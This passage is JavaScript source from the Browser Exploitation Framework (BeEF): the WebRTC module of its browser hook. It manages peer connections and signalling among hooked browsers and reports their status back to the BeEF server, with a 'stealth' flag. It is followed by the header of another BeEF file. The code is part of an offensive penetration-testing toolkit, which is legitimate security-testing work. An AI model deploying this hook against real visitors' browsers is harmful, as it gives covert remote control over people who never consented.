  var constraints = this.mergeConstraints(this.offerConstraints, this.sdpConstraints);
  var self = this;
  globalrtc[this.peerid].createOffer(this.setLocalAndSendMessage, this.onCreateSessionDescriptionError, constraints);
  beef.debug('Sending offer to peer, with constraints: \n' +
             '  \'' + JSON.stringify(constraints) + '\'.');
}

// Helper method to merge SDP constraints
Beefwebrtc.prototype.mergeConstraints = function(cons1, cons2) {
  var merged = cons1;
  for (var name in cons2.mandatory) {
    merged.mandatory[name] = cons2.mandatory[name];
  }
  merged.optional.concat(cons2.optional);
  return merged;
}

// Sets the local RTC session description, sends this information back (via signalling)
// The caller uses this to set it's local description, and it then has to send this to the peer (via signalling)
// The receiver uses this information too - and vice-versa - hence the signaling
Beefwebrtc.prototype.setLocalAndSendMessage = function(sessionDescription) {
  // This fucking function does NOT receive a 'this' state, and you can't pass additional parameters
  // Stupid .. javascript :(
  // So I'm hacking it to find the peerid gah - I believe *this* is what means you can't establish peers concurrently
  // i.e. this browser will have to wait for this peerconnection to establish before attempting to connect to the next one..
  var peerid = null;

  for (var k in beefrtcs) {
    if (beefrtcs[k].allgood === false) {
      peerid = beefrtcs[k].peerid;
    }
  }
  beef.debug("For peer: " + peerid + " Running setLocalAndSendMessage...");

  globalrtc[peerid].setLocalDescription(sessionDescription, onSetSessionDescriptionSuccess, onSetSessionDescriptionError);
  beefrtcs[peerid].sendSignalMsg(sessionDescription);

  function onSetSessionDescriptionSuccess() {
    beef.debug('Set session description success.');
  }

  function onSetSessionDescriptionError() {
    beef.debug('Failed to set session description');
  }
}

// If the browser can't build an SDP
Beefwebrtc.prototype.onCreateSessionDescriptionError = function(error) {
  beef.debug('Failed to create session description: ' + error.toString());
}

// If the browser successfully sets a remote description
Beefwebrtc.prototype.onSetRemoteDescriptionSuccess = function() {
  beef.debug('Set remote session description successfully');
}

// Check for messages - which includes signaling from a calling peer - this gets kicked off in maybeStart()
Beefwebrtc.prototype.calleeStart = function() {
  // Callee starts to process cached offer and other messages.
  while (this.msgQueue.length > 0) {
    this.processSignalingMessage(this.msgQueue.shift());
  }
}

// Process messages, this is how we handle the signaling messages, such as candidate info, offers, answers
Beefwebrtc.prototype.processSignalingMessage = function(message) {
  if (!this.started) {
    beef.debug('peerConnection has not been created yet!');
    return;
  }

  if (message.type === 'offer') {
    beef.debug("Processing signalling message: OFFER");
    if (navigator.mozGetUserMedia) { // Mozilla shim fuckn shit - since the new
                                     // version of FF - which no longer works
        beef.debug("Moz shim here");
        globalrtc[this.peerid].setRemoteDescription(
            new RTCSessionDescription(message),
            function() {
              // globalrtc[this.peerid].createAnswer(function(answer) {
              //   globalrtc[this.peerid].setLocalDescription(

              var peerid = null;

              for (var k in beefrtcs) {
                if (beefrtcs[k].allgood === false) {
                  peerid = beefrtcs[k].peerid;
                }
              }

              globalrtc[peerid].createAnswer(function(answer) {
                globalrtc[peerid].setLocalDescription(
                    new RTCSessionDescription(answer),
                    function() {
                      beefrtcs[peerid].sendSignalMsg(answer);
                    },function(error) {
                      beef.debug("setLocalDescription error: " + error);
                    });
              },function(error) {
                beef.debug("createAnswer error: " +error);
              });
            },function(error) {
              beef.debug("setRemoteDescription error: " + error);
            });
                          
    } else {
      this.setRemote(message);
      this.doAnswer();
    }
  } else if (message.type === 'answer') {
    beef.debug("Processing signalling message: ANSWER");
    if (navigator.mozGetUserMedia) { // terrible moz shim - as for the offer
        beef.debug("Moz shim here");
        globalrtc[this.peerid].setRemoteDescription(
          new RTCSessionDescription(message),
          function() {},
          function(error) {
            beef.debug("setRemoteDescription error: " + error);
          });
    } else {
      this.setRemote(message);
    }
  } else if (message.type === 'candidate') {
    beef.debug("Processing signalling message: CANDIDATE");
    var candidate = new RTCIceCandidate({sdpMLineIndex: message.label,
                                         candidate: message.candidate});
    this.noteIceCandidate("Remote", this.iceCandidateType(message.candidate));
    globalrtc[this.peerid].addIceCandidate(candidate, this.onAddIceCandidateSuccess, this.onAddIceCandidateError);
  } else if (message.type === 'bye') {
    this.onRemoteHangup();
  }
}

// Used to set the RTC remote session
Beefwebrtc.prototype.setRemote = function(message) {
    globalrtc[this.peerid].setRemoteDescription(new RTCSessionDescription(message),
       this.onSetRemoteDescriptionSuccess, this.onSetSessionDescriptionError);
}

// As part of the processSignalingMessage function, we check for 'offers' from peers. If there's an offer, we answer, as below
Beefwebrtc.prototype.doAnswer = function() {
  beef.debug('Sending answer to peer.');
  globalrtc[this.peerid].createAnswer(this.setLocalAndSendMessage, this.onCreateSessionDescriptionError, this.sdpConstraints);
}

// Helper method to determine what kind of ICE Candidate we've received
Beefwebrtc.prototype.iceCandidateType = function(candidateSDP) {
  if (candidateSDP.indexOf("typ relay ") >= 0)
    return "TURN";
  if (candidateSDP.indexOf("typ srflx ") >= 0)
    return "STUN";
  if (candidateSDP.indexOf("typ host ") >= 0)
    return "HOST";
  return "UNKNOWN";
}

// Event handler for successful addition of ICE Candidates
Beefwebrtc.prototype.onAddIceCandidateSuccess = function() {
  beef.debug('AddIceCandidate success.');
}

// Event handler for unsuccessful addition of ICE Candidates
Beefwebrtc.prototype.onAddIceCandidateError = function(error) {
  beef.debug('Failed to add Ice Candidate: ' + error.toString());
}

// If a peer hangs up (we bring down the peerconncetion via the stop() method)
Beefwebrtc.prototype.onRemoteHangup = function() {
  beef.debug('Session terminated.');
  this.initiator = 0;
  // transitionToWaiting();
  this.stop();
}

// Bring down the peer connection
Beefwebrtc.prototype.stop = function() {
  this.started = false; // we're no longer started
  this.signalingReady = false; // signalling isn't ready
  globalrtc[this.peerid].close(); // close the RTCPeerConnection option
  globalrtc[this.peerid] = null; // Remove it
  this.msgQueue.length = 0; // clear the msgqueue
  rtcstealth = false; // no longer stealth
  this.allgood = false; // allgood .. NAH UH
}

// The actual beef.webrtc wrapper - this exposes only two functions directly - start, and status
// These are the methods which are executed via the custom extension of the hook.js
beef.webrtc = {
  // Start the RTCPeerConnection process
  start: function(initiator,peer,turnjson,stunservers,verbose) {
    if (peer in beefrtcs) {
      // If the RTC peer is not in a good state, try kickng it off again
      // This is possibly not the correct way to handle this issue though :/ I.e. we'll now have TWO of these objects :/
      if (beefrtcs[peer].allgood == false) {
        beefrtcs[peer] = new Beefwebrtc(initiator, peer, turnjson, stunservers, verbose);
        beefrtcs[peer].initialize();
      }
    } else {
      // Standard behaviour for new peer connections
      beefrtcs[peer] = new Beefwebrtc(initiator,peer,turnjson, stunservers, verbose);
      beefrtcs[peer].initialize();
    }
  },

  // Check the status of all my peers .. 
  status: function(me) {
    if (Object.keys(beefrtcs).length > 0) {
      for (var k in beefrtcs) {
        if (beefrtcs.hasOwnProperty(k)) {
          beef.net.send('/rtcmessage',0,{peerid: k, message: "Status checking - allgood: " + beefrtcs[k].allgood});
        }
      }
    } else {
      beef.net.send('/rtcmessage',0,{peerid: me, message: "No peers?"});
    }
  }
}
beef.regCmp('beef.webrtc');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
 Sometimes there are timing issues and looks like beef_init
 is not called at all (always in cross-origin situations,
 for example calling the hook with jquery getScript,
 or sometimes with event handler injections).

 To fix this, we call again beef_init after 1 second.
 Cheers to John Wilander that discussed this bug with me at OWASP AppSec Research Greece
 antisnatchor
 */
//setTimeout(beef_init, 1000);


